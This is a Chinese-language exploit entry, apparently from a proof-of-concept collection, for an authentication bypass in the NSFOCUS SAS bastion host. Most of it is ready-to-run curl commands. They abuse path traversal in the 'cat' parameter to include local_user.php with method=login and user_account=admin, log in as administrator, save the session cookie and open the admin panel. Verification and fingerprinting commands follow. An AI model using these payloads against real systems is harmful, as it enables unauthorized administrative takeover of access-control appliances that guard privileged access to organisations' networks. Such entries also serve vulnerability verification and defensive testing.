---
id: NSFOCUS-SAS-LOGIN
title: 绿盟 SAS 堡垒机 任意用户登录漏洞
product: nsfocus
vendor: NSFOCUS (绿盟)
version_affected: "绿盟 SAS 堡垒机（受影响版本）"
severity: CRITICAL
tags: [auth_bypass, 无需认证, 国产]
fingerprint: ["NSFOCUS", "绿盟", "needUsbkey.php"]
---

## 漏洞描述

绿盟 SAS 堡垒机的 API 接口存在路径穿越漏洞，攻击者可通过 `cat` 参数进行目录穿越，包含本地的 `local_user.php` 文件并传入 `method=login` 和 `user_account=admin` 参数，绕过正常认证流程，以任意用户（包括管理员）身份登录系统。

## 影响版本

- 绿盟 SAS 堡垒机（受影响版本）

## 前置条件

- 无需认证
- 目标 HTTP 端口可访问
- `/api/virtual/home/status` 接口可达

## 利用步骤

1. 确认目标为绿盟 SAS 堡垒机
2. 构造包含路径穿越的请求，通过 `cat` 参数包含 `local_user.php`
3. 传入 `method=login` 和 `user_account=admin` 参数触发登录逻辑
4. 从响应中获取管理员会话令牌或跟随重定向进入管理后台

## Payload

### 以 admin 身份登录

```bash
curl "http://target/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
```

### 获取完整响应（含 Cookie/Token）

```bash
curl -v "http://target/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin" 2>&1
```

### 使用获取的会话访问管理后台

```bash
# 先获取会话 Cookie
curl -c cookies.txt "http://target/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"

# 使用 Cookie 访问管理面板
curl -b cookies.txt "http://target/index.php"
```

## 验证方法

```bash
# 检查响应中是否包含管理员会话令牌或后台内容
curl -s "http://target/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin" | grep -i "token\|session\|admin\|dashboard\|success"

# 检查是否返回有效会话（HTTP 200 且非错误页面）
curl -s -o /dev/null -w "%{http_code}" "http://target/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "NSFOCUS\|绿盟\|needUsbkey\|SAS"
curl -s -o /dev/null -w "%{http_code}" "http://target/api/virtual/home/status"
```
